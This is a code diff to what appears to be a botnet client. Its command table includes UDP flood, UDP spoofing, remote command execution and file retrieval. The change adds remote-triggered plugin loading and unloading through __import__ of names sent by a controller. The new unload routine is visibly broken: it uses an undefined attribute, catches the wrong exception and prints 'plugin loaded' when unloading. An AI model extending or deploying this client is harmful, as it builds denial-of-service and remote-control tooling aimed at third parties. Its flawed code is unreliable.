@@ -98,6 +98,7 @@ class Client(object):
         self.port = int(port)
         self.quit_signal = False
         self.version = ("%s-%s" %(__version__, "full"))
+        self.plugins = {}
         self.comm_dict = {
             '00000' : 'killMe',
             '00001' : 'getFile',
@@ -108,7 +109,8 @@ class Client(object):
             '00006' : 'udpSpoof',
             '00007' : 'command',
             '00008' : 'KILL',
-            '00009' : 'loadPlugin'
+            '00009' : 'loadPlugin',
+            '00010' : 'unloadPlugin'
         }
         self.comm_swtch = {
             'killMe'    : self.kill_me,
@@ -119,7 +121,8 @@ class Client(object):
             'udpFlood'  : self.udp_flood,
             'udpSpoof'  : self.udp_spoof,
             'command'   : self.run_cm,
-            'loadPlugin': self.load_plugin
+            'loadPlugin': self.load_plugin,
+            'unloadPlugin': self.unload_plugin
         }
 
     def loop(self):
@@ -368,17 +371,25 @@ class Client(object):
 
     def load_plugin(self):
         """Asyncronously load a plugin."""
-        en_data = self.receive(3) # Max ip+port+payload length 999 chars
+        en_data = self.receive(3) # Max plugin name length 999 chars
         en_data = self.receive(int(en_data))
 
-        __import__(en_data)
-        print("%s: plugin loaded." % en_data)
-        # try:
-            # __import__(en_data)
-            # print("%s: plugin loaded." % en_data)
-            # # self.plugins["loaded"][plugin] = self.plugins["installed"][plugin]
-        # except ImportError:
-            # print("%s: plugin failed to load or does not exist." % en_data)
+        try:
+            self.plugins[en_data] = __import__(en_data)
+            print("%s: plugin loaded." % en_data)
+        except ImportError:
+            print("%s: plugin failed to load or does not exist." % en_data)
+
+    def unload_plugin(self):
+        """Asyncronously load a plugin."""
+        en_data = self.receive(3) # Max plugin name length 999 chars
+        en_data = self.receive(int(en_data))
+
+        try:
+            del self.loaded_plugins[en_data]
+            print("%s: plugin loaded." % en_data)
+        except ImportError:
+            print("%s: plugin failed to load or does not exist." % en_data)
 
 
 class PluginMount(type):
